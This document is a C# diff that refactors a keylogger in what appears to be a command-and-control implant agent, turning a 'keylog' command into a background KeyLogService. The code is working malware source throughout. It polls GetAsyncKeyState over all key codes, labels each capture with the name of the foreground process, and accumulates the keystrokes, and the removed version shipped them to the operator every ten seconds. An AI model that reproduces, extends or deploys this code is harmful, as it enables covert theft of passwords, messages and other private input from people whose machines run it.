@@ -1,23 +1,23 @@
-﻿using System;
+﻿using Agent.Communication;
+using Agent.Service.Pivoting;
+using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.Windows.Input;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Threading;
-using Agent.Models;
 using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
 
-namespace Agent.Commands
+namespace Agent.Service
 {
-    public class KeyLoggerCommand : AgentCommand
+    public class KeyLogService : RunningService, IKeyLogService
     {
-        object __lockObj = new object();
-        private bool isRunning;
-        public override string Name => "keylog";
+        public override string ServiceName => "Key Logger";
+
+        public string LoggedKeyStrokes { get; private set; } = string.Empty;
+
 
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
@@ -28,81 +28,40 @@ namespace Agent.Commands
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        string activeProcessName;
+        string prevProcessName;
+
+        public override void Start()
         {
-            if (task.SplittedArgs.Length > 0 && task.SplittedArgs[0] == "stop")
-            {
-                lock (__lockObj)
-                {
-                    if (isRunning)
-                    {
-                        isRunning = false;
-                    }
-                    else
-                    {
-                        context.Result.Result = "KeyLogger is not running!";
-                    }
-                }
-                return;
-            }
+            activeProcessName = GetActiveWindowProcessName().ToLower();
+            prevProcessName = activeProcessName;
+            base.Start();
+        }
 
-            lock (__lockObj)
+        public override void Process()
+        {
+            base.Process();
+
+            activeProcessName = GetActiveWindowProcessName().ToLower();
+            bool isOldProcess = activeProcessName.Equals(prevProcessName);
+            if (!isOldProcess)
             {
-                if (isRunning)
-                {
-                    context.Result.Result = "KeyLogger is already running!";
-                    return;
-                }
-                else
-                    isRunning = true;
+                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]";
+                prevProcessName = activeProcessName;
             }
 
 
-            Stopwatch watch = new Stopwatch();
-            watch.Start();
-            string activeProcessName = GetActiveWindowProcessName().ToLower();
-            string prevProcessName = activeProcessName;
-
-            context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
-
-            while (true)
+            for (int i = 0; i < 255; i++)
             {
-                lock (__lockObj)
+                int key = GetAsyncKeyState(i);
+                //if (key != 0)
+                //    Debug.WriteLine($"{i} : {key}");
+                if (key == 32769)
                 {
-                    if (!isRunning)
-                        break;
+                    var keyStr = verifyKey(i);
+                    //Debug.WriteLine($"Pressed {i} : {keyStr}");
+                    LoggedKeyStrokes += keyStr;
                 }
-                Thread.Sleep(5);
-
-                if (watch.ElapsedMilliseconds >= 10000)
-                {
-                    watch.Reset();
-                    context.MessageService.SendResult(context.Result);
-                    watch.Start();
-                }
-
-                activeProcessName = GetActiveWindowProcessName().ToLower();
-                bool isOldProcess = activeProcessName.Equals(prevProcessName);
-                if (!isOldProcess)
-                {
-                    context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
-                    prevProcessName = activeProcessName;
-                }
-
-
-                for (int i = 0; i < 255; i++)
-                {
-                    int key = GetAsyncKeyState(i);
-                    //if (key != 0)
-                    //    Debug.WriteLine($"{i} : {key}");
-                    if (key == 32769)
-                    {
-                        var keyStr = verifyKey(i);
-                        //Debug.WriteLine($"Pressed {i} : {keyStr}");
-                        context.Result.Result += keyStr;
-                    }
-                }
-
             }
         }
 
@@ -112,7 +71,7 @@ namespace Agent.Commands
             {
                 IntPtr windowHandle = GetForegroundWindow();
                 GetWindowThreadProcessId(windowHandle, out uint processId);
-                Process process = Process.GetProcessById((int)processId);
+                Process process = System.Diagnostics.Process.GetProcessById((int)processId);
 
                 return process.ProcessName;
             }
